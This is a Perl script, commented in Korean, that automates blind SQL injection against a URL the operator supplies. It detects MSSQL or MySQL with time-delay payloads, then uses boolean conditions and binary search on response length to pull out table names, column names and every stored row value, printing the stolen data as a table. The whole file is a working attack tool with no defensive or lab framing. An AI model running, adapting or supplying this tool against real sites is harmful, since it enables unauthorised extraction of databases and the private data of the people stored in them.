#!/usr/bin/perl
use warnings;
use strict;
use 5.010;
use WWW::Mechanize::Timed;
my $ua=WWW::Mechanize::Timed->new();

print "input URL you want to attack>";
chomp(my $origin_url=<stdin>);
my $url=$origin_url;

#데이터베이스 종류
eval{$ua->get($url."; waitfor delay '0:0:2' --")};
my $time=$ua->client_total_time; 
my $db_name;
if($time>2)
{
	$db_name="mssql";
}
else
{
	eval{$ua->get($url." and sleep(3)")};
	$time=$ua->client_total_time; 
	$db_name="mysql" if $time>2;
}
say "데이터베이스:$db_name";

my ($response,$header);
my ($con_len,$table_num,$head,$mid,$tail);
my $origin_con_len=get_content_length();

$head=1;
$tail=10;
#테이블 갯수 구하기
while(1)
{			
	get_mid();
	$url.=" and (select count(table_name) from information_schema.tables)=".$mid.";" if $db_name eq "mssql";
	$url.=" and (select count(table_name) from information_schema.tables where table_schema=database())=".$mid.";" if $db_name eq "mysql";
	$con_len=get_content_length();	
	if($origin_con_len<=$con_len)
	{
		$table_num=$mid;
		last;
	}	
	
	$url.=" and (select count(table_name) from information_schema.tables)>".$mid.";" if $db_name eq "mssql";
  $url.=" and (select count(table_name) from information_schema.tables where table_schema=database())>".$mid.";" if $db_name eq "mysql";
	say $url;
	$con_len=get_content_length();	
	check_content_length(1);
}
say "테이블 갯수: $table_num";

my (@table_name_length,@table_names,@origin_table_names,$table_name);
my ($i,$j,$k);
my %table_info;
for($i=0;$i<$table_num;$i++) #테이블 갯수만큼 반복(전체: while문과 for문  포함)
{
	$head=1;
  $tail=10;
	while(1) #테이블 길이 구하는 이진탐색
  {
	  $mid=get_mid();
		if($db_name eq "mssql")
		{
			$url.=" and len((select top 1 table_name from information_schema.tables))=".$mid.";" if $i eq 0;
			$url.=" and len((select top 1 table_name from information_schema.tables where table_name not in (select top ".$i." table_name from information_schema.tables)))=".$mid.";" if $i>0;
	  }	
		if($db_name eq "mysql")
		{
			$url.=" and length((select table_name from information_schema.tables where table_schema=database() limit 1))=".$mid.";" if $i eq 0;
			$url.=" and length((select table_name from information_schema.tables where table_schema=database() and table_name not in ("."@table_names".") limit 1))=".$mid.";" if $i>0;
		}
		$con_len=get_content_length();		
		if($origin_con_len<=$con_len)
    {
			push @table_name_length, $mid; #각 테이블 길이가 저장된 배열
    	say "테이블길이:$table_name_length[$i]";
			last;
	  }
		
		if($db_name eq "mssql")
		{
			$url.=" and len((select top 1 table_name from information_schema.tables))>".$mid.";" if $i eq 0;
			$url.=" and len((select top 1 table_name from information_schema.tables where table_name not in (select top ".$i." table_name from information_schema.tables)))>".$mid.";" if $i>0;
  	}
		if($db_name eq "mysql")
	  {
      $url.=" and length((select table_name from information_schema.tables where table_schema=database() limit 1))>".$mid.";" if $i eq 0;
			$url.=" and length((select table_name from information_schema.tables where table_schema=database() and table_name not in ("."@table_names".") limit 1))>".$mid.";" if $i>0;
		}
		say $url;
		$con_len=get_content_length();
		check_content_length(1);
	}
  $k=1;  
	$table_name="";
	
	#테이블 이름 구하기
	for($j=0;$j<$table_name_length[$i];$j++) #위에서 구한 테이블 이름의 길이만큼 반복
	{					
		$head=65;
    $tail=122;
    while(1) #테이블 이름 한글자 구하는 이진탐색			
	  {	 
	    get_mid();
    	if($db_name eq "mssql")
			{
				$url.=" and isnull(ascii(substring((select top 1 table_name from information_schema.tables),".$k.",1)),0)=".$mid.";" if $i eq 0;
	    	$url.=" and isnull(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in("."@table_names".")),".$k.",1)),0)=".$mid.";" if $i>0;
			}
			if($db_name eq "mysql")
			{
			  $url.=" and ifnull(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1),".$k.",1)),0)=".$mid.";" if $i eq 0;
				$url.=" and ifnull(ascii(substring((select table_name from information_schema.tables where table_schema=database() and table_name not in("."@table_names".") limit 1),".$k.",1)),0)=".$mid.";" if $i>0;	
			}
		  $con_len=get_content_length();	
			if($origin_con_len<=$con_len)
	    {
	    	$table_name.=chr($mid); #아스키코드로 변환해서 한글자씩 연결
				say "테이블 이름:$table_name";
				last;
			}
			
			if($db_name eq "mssql")
			{				
				$url.=" and isnull(ascii(substring((select top 1 table_name from information_schema.tables),".$k.",1)),0)>".$mid.";" if $i eq 0;
      	$url.=" and isnull(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in("."@table_names".")),".$k.",1)),0)>".$mid.";" if $i>0;
			}
			if($db_name eq "mysql")
			{
				$url.=" and ifnull(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1),".$k.",1)),0)>".$mid.";" if $i eq 0;
				$url.=" and ifnull(ascii(substring((select table_name from information_schema.tables where table_schema=database() and table_name not in("."@table_names".") limit 1),".$k.",1)),0)>".$mid.";" if $i>0;	
			}
			say $url;
		  $con_len=get_content_length($ua,$url);		
		  check_content_length(2);
		}	
		$k++;
	}
	push @origin_table_names,$table_name; #필드구할떄 쓰기 위한 원래 테이블이름 배열
	push @table_names,"'".$table_name."'";
    $table_info{$table_name}=1;
	$table_names[$i]=",".$table_names[$i] if $i>0;
	say @table_names;
}

my ($field_num,$field_name);
my (@field_name_length,@field_names,@origin_field_names,@selected_tables);
my ($current_table,$origin_current_table);

$i=0;
$j=0;
$k=1;
while(1)
{
	$head=1;
  $tail=10;	
  print "input table you want>";
	$current_table=<stdin>;
	chomp($current_table);
	$origin_current_table=$current_table;
	last if $current_table eq 'q';
    next unless exists $table_info{$current_table};
	push @selected_tables,$current_table;
	say "현재 테이블: $current_table";			
	
    $current_table="'".$current_table."'";			
	while(1) #필드 갯수 구하기
  {
	  get_mid();
		$url.=" and (select count(column_name) from information_schema.columns where table_name=".$current_table.")=".$mid.";" if $db_name eq "mssql";
		$url.=" and (select count(column_name) from information_schema.columns where table_name=".$current_table.")=".$mid.";" if $db_name eq "mysql";
		$con_len=get_content_length();	
		if($origin_con_len<=$con_len)
		{
			$field_num=$mid;
			last;
		}		
		
	  $url.=" and (select count(column_name) from information_schema.columns where table_name=".$current_table.")>".$mid.";" if $db_name eq "mssql";
		$url.=" and (select count(column_name) from information_schema.columns where table_name=".$current_table.")>".$mid.";" if $db_name eq "mysql";
		say "$url";
		$con_len=get_content_length();	
		check_content_length(1);
	}
	say "필드갯수: $field_num";
  @field_names=();
  @origin_field_names=();
	for($i=0;$i<$field_num;$i++) #필드갯수만큼
	{
		$head=1;
    $tail=10;	
		while(1) #필드 이름 길이 구하기
		{
	    get_mid();
			if($db_name eq "mssql")
			{
				$url.=" and len((select top 1 column_name from information_schema.columns where table_name=".$current_table."))=".$mid.";" if $i eq 0;
				$url.=" and len((select top 1 column_name from information_schema.columns where table_name=".$current_table." and column_name not in ("."@field_names".")))=".$mid.";" if $i>0;
	  	}
			if($db_name eq "mysql")
			{
				$url.=" and length((select column_name from information_schema.columns where table_name=".$current_table." limit 1))=".$mid.";" if $i eq 0;
				$url.=" and length((select column_name from information_schema.columns where table_name=".$current_table." and column_name not in("."@field_names".") limit 1))=".$mid.";" if $i>0;
			}
		  $con_len=get_content_length();			
			if($origin_con_len<=$con_len)
    	{
				push @field_name_length, $mid; #각 필드  길이가 저장된 배열
    		say "필드길이:$field_name_length[$i]";
				last;
	  	}

			if($db_name eq "mssql")
			{
				$url.=" and len((select top 1 column_name from information_schema.columns where table_name=".$current_table."))>".$mid.";" if $i eq 0;
				$url.=" and len((select top 1 column_name from information_schema.columns where table_name=".$current_table." and column_name not in ("."@field_names".")))>".$mid.";" if $i>0;
  		}
			if($db_name eq "mysql")
			{
				$url.=" and length((select column_name from information_schema.columns where table_name=".$current_table." limit 1))>".$mid.";" if $i eq 0;
				$url.=" and length((select column_name from information_schema.columns where table_name=".$current_table." and column_name not in("."@field_names".") limit 1))>".$mid.";" if $i>0;
			}
			say "$url";
		  $con_len=get_content_length();	
		  check_content_length(1);
		}
		$k=1;
    $field_name="";
		
		for($j=0;$j<$field_name_length[$i];$j++)
		{
			$head=65;
      $tail=122;
      while(1) 	
	  	{	 
	      get_mid();
				if($db_name eq "mssql")
				{
					$url.=" and isnull(ascii(substring((select top 1 column_name from information_schema.columns where table_name=".$current_table."),".$k.",1)),0)=".$mid.";" if $i eq 0;
	    		$url.=" and isnull(ascii(substring((select top 1 column_name from information_schema.columns where table_name=".$current_table." and column_name not in("."@field_names".")),".$k.",1)),0)=".$mid.";" if $i>0;
				}
				if($db_name eq "mysql")
				{
				  $url.=" and ifnull(ascii(substr((select column_name from information_schema.columns where table_name=".$current_table." limit 1),".$k.",1)),0)=".$mid.";" if $i eq 0;
					$url.=" and ifnull(ascii(substr((select column_name from information_schema.columns where table_name=".$current_table." and column_name not in("."@field_names".")limit 1),".$k.",1)),0)=".$mid.";" if $i>0;
				}
		    $con_len=get_content_length($ua,$url);	
				if($origin_con_len<=$con_len)
	    	{
	    		$field_name.=chr($mid); #아스키코드로 변환해서 한글자씩 연결
					say "필드 이름:$field_name";
					last;
				}
				
				if($db_name eq "mssql")
				{
					$url.=" and isnull(ascii(substring((select top 1 column_name from information_schema.columns where table_name=".$current_table." ),".$k.",1)),0)>".$mid.";" if $i eq 0;
      		$url.=" and isnull(ascii(substring((select top 1 column_name from information_schema.columns where table_name=".$current_table." and column_name not in("."@field_names".")),".$k.",1)),0)>".$mid.";" if $i>0;
				}
				if($db_name eq "mysql")
				{
					$url.=" and ifnull(ascii(substr((select column_name from information_schema.columns where table_name=".$current_table." limit 1),".$k.",1)),0)>".$mid.";" if $i eq 0;
					$url.=" and ifnull(ascii(substr((select column_name from information_schema.columns where table_name=".$current_table." and column_name not in("."@field_names".")limit 1),".$k.",1)),0)>".$mid.";" if $i>0;
				}
				say $url;
		    $con_len=get_content_length();	
		    check_content_length(2);
			}		
		  $k++;
    }
		push @origin_field_names,$field_name; #필드구할떄 쓰기 위한 원래 테이블이름 배열
		push @field_names,"'".$field_name."'";
		$field_names[$i]=",".$field_names[$i] if $i>0;
		say @field_names;
	}
	$table_info{$origin_current_table}="@field_names";
	@field_name_length=();

	my %field_info;
	my ($field_value_num,$field_value,$count);
	my (@field_value_length,@field_values,@origin_field_values);

	$count=0;
	$i=0;
	$j=0;
	$k=1;
	$head=1;
	$tail=100;
	while(1) #필드의 값 개수 구하기
	{
	 	get_mid();
		$url.=" and (select count(*) from ".$origin_current_table.")=".$mid.";";
		$con_len=get_content_length();	
		if($origin_con_len<=$con_len)
		{
			$field_value_num=$mid;
			last;
		}			
		
		$url.=" and (select count(*) from ".$origin_current_table.")>".$mid.";";
		say "$url";
		$con_len=get_content_length();	
   	check_content_length(3);
 	}
	say "필드값 갯수: $field_value_num";
 
	for my $field (@origin_field_names)
	{
 	@field_values=();
	for($i=0;$i<$field_value_num;$i++) #필드값 갯수만큼
		{
			$head=1;
    	$tail=10;
			$count=0;
			while(1) #필드 값 문자열 길이 구하기
			{
	    	get_mid();
				if($db_name eq "mssql")
				{
					$url.=" and len((select top 1 ".$field." from ".$origin_current_table."))=".$mid.";" if $i eq 0;
					$url.=" and len((select top 1 ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".")))=".$mid.";" if $i>0;
				}
				if($db_name eq "mysql")
				{
					$url.=" and length((select ".$field." from ".$origin_current_table." limit 1))=".$mid.";" if $i eq 0;
					$url.=" and length((select ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".") limit 1))=".$mid.";" if $i>0;
				}
		  	$con_len=get_content_length();	
				if($origin_con_len<=$con_len)
	  		{
    			push @field_value_length, $mid; #각 필드값 길이가 저장된 배열
    			say "필드값길이:$field_value_length[$i]";
					last;
	  		}
			
				if($db_name eq "mssql")
				{
					$url.=" and len((select top 1 ".$field." from ".$origin_current_table."))>".$mid.";" if $i eq 0;
					$url.=" and len((select top 1 ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".")))>".$mid.";" if $i>0;
				}
				if($db_name eq "mysql")
				{
					$url.=" and length((select ".$field." from ".$origin_current_table." limit 1))>".$mid.";" if $i eq 0;
					$url.=" and length((select ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".") limit 1))>".$mid.";" if $i>0;
				}
				say "$url";
				$con_len=get_content_length($ua,$url);	
				if($origin_con_len<=$con_len)
 	 			{
					$head=$mid+1;
					$tail=$tail+20 if $mid%10 eq 0;
	 			}
				else
				{
					$tail=$mid-1;
					$count++ if $mid eq 1;
					last if $count eq 3;
				}
   		}
			$k=1;
    	$field_value="";
			for($j=0;$j<$field_value_length[$i];$j++)
			{		
				if($count eq 3)
				{
					$field_value="undef";			
					say "필드값:$field_value";
					last;
				}	
				$head=65;
      	$tail=122;
      	while(1) #필드값한글자 구하는 이진탐색			
	  		{	 
	      	get_mid();
					if($db_name eq "mssql")
					{
						$url.=" and isnull(ascii(substring(cast((select top 1 ".$field." from ".$origin_current_table.") as char),".$k.",1)),0)=".$mid if $i eq 0;
	    			$url.=" and isnull(ascii(substring(cast((select top 1 ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".")) as char),".$k.",1)),0)=".$mid if $i > 0;
					}
					if($db_name eq "mysql")
					{
						$url.=" and ifnull(ascii(substr(cast((select ".$field." from ".$origin_current_table." limit 1) as char),".$k.",1)),0)=".$mid if $i eq 0;
	    			$url.=" and ifnull(ascii(substr(cast((select ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".") limit 1) as char),".$k.",1)),0)=".$mid if $i > 0;
					}
		   	  $con_len=get_content_length();	
					if($origin_con_len<=$con_len)
	    		{
	    			$field_value.=chr($mid); #아스키코드로 변환해서 한글자씩 연결
						say "필드 값:$field_value";
						last;
					}
				
					if($db_name eq "mssql")
					{
						$url.=" and isnull(ascii(substring(cast((select top 1 ".$field." from ".$origin_current_table.") as char),".$k.",1)),0)>".$mid if $i eq 0;
      			$url.=" and isnull(ascii(substring(cast((select top 1 ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".")) as char),".$k.",1)),0)>".$mid if $i > 0;
       	 }
					if($db_name eq "mysql")
					{
						$url.=" and ifnull(ascii(substr(cast((select ".$field." from ".$origin_current_table." limit 1) as char),".$k.",1)),0)>".$mid if $i eq 0;
	    			$url.=" and ifnull(ascii(substr(cast((select ".$field." from ".$origin_current_table." where ".$field." not in ("."@field_values".") limit 1) as char),".$k.",1)),0)>".$mid if $i > 0;
					}
					say $url;
		   	  $con_len=get_content_length();	
       	  check_content_length(2);
				}		
		 	  $k++;
   		}
			push @origin_field_values,$field_value; 
			push @field_values,"'".$field_value."'";
			$field_values[$i]=",".$field_values[$i] if $i>0;
			say "현재까지 필드값들:@field_values";
		}
		push @origin_field_values,"//";
		@field_value_length=();
	}
    my $max_length=15;
    my $max_string=10;

    printf "%${max_length}s"x($#origin_field_names+1), @origin_field_names;
    say '';

    for(my $i=0; $i<$field_value_num; $i++)
    {
        for(my $j=0; $j<($#origin_field_names)+1; $j++)
        {
            my $current_field_value = $origin_field_values[$i+($j*($field_value_num+1))];
            if(length($current_field_value)>$max_string)
            {
                substr($current_field_value, $max_string) = '...';
            }
            printf "%${max_length}s", $current_field_value;
        }
        say '';
    }
    say '';
	@origin_field_values=();
}

sub get_content_length
{
	my $response=eval{$ua->get($url)};
	$header=$ua->response->headers;
  $con_len=${$header}{'content-length'}||"";
	$con_len=length($response->decoded_content()) if $con_len eq "";
	$url=$origin_url;
  return $con_len;
}

sub get_mid
{
	$mid=($head+$tail)/2+0.5 if ($head+$tail)%2 eq 1;
	$mid=($head+$tail)/2 if ($head+$tail)%2 eq 0;
	say "head:$head tail:$tail mid:$mid";
  return $mid;
}

sub check_content_length
{
	my $flag=shift;
	if($flag eq 2)
	{
		$head=$mid+1 if $origin_con_len<=$con_len;
	  $tail=$mid-1 if $origin_con_len>$con_len;
		$head=32 if $mid eq 65;
	}
	else
	{
		if($origin_con_len<=$con_len)
  	{
			$head=$mid+1;
			if($flag eq 1)
			{
				$tail+=20 if $mid%10 eq 0;
			}
			if($flag eq 3)
			{
				$tail+=100 if $mid%100 eq 0;
		  }
		}
		else
		{
			$tail=$mid-1;
		}
	}		
}
